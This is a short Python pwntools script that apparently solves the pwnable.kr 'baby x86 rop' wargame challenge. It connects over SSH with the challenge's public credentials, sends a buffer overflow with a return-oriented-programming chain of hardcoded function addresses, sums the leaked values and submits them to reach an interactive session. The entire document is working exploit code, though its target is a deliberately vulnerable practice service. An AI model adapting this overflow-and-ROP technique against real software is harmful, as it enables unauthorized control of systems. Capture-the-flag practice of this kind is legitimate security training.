###baby x86 rop
from pwn import *

###Addr
A = 0x809fe4b
B = 0x809fe6a
C = 0x809fe89
D = 0x809fea8
E = 0x809fec7
F = 0x809fee6
G = 0x809ff05
ropme = 0x809fff9

###Exploit
s = ssh(host='pwnable.kr', port=2222,
        user='asm',
        password='guest')
r = s.remote('127.0.0.1',9032)

padding = b'a'*0x78
ROPchain  = p32(A)
ROPchain += p32(B)
ROPchain += p32(C)
ROPchain += p32(D)
ROPchain += p32(E)
ROPchain += p32(F)
ROPchain += p32(G)
ROPchain += p32(ropme)
payload = padding+ROPchain

r.sendlineafter('Menu:','0')
r.sendlineafter('earned? : ',payload)
r.recvline()
val = 0
for i in range(7):
    val+=int(r.recvline().decode().strip().split('EXP +')[1][:-1])
r.sendlineafter('Menu:','0')
r.sendlineafter('earned? : ',str(val))
r.interactive()
